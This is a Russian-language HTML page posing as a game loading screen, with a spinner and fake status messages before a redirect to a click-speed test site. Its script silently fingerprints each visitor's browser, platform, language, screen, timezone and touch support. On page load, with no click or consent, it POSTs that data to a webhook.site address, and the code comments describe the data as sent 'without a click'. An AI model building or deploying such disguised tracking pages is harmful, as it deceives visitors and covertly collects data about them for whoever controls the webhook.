<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка игры...</title>
<style>
  body{font-family:-apple-system,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
  .box{text-align:center}
  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#2a6;
        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
  p{opacity:.8;font-size:16px;margin-bottom:20px}
  .fake-btn{background:#333;color:#777;border:0;padding:12px 30px;border-radius:8px;font-size:14px;cursor:not-allowed}
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <p id="msg">Подключение к серверу...</p>
  <button class="fake-btn" disabled>Ожидайте...</button>
</div>

<script>
// Твой webhook
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";

// Собираем данные без запроса GPS
let data = {
  event: "silent_visit",
  ts: new Date().toISOString(),
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.language,
  screen: screen.width + "x" + screen.height,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  touch: navigator.maxTouchPoints
};

// Отправляем данные сразу при открытии (без клика)
fetch(HOOK, {
  method: "POST",
  mode: "no-cors",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify(data)
}).catch(e => {});

// Анимация текста
let msg = document.getElementById("msg");
let steps = ["Подключение к серверу...", "Загрузка ресурсов...", "Почти готово..."];
let i = 0;
setInterval(() => { i++; if (i < steps.length) msg.textContent = steps[i]; }, 1000);

// Через 3 секунды редирект на игру
setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 3000);
</script>
</body>
</html>
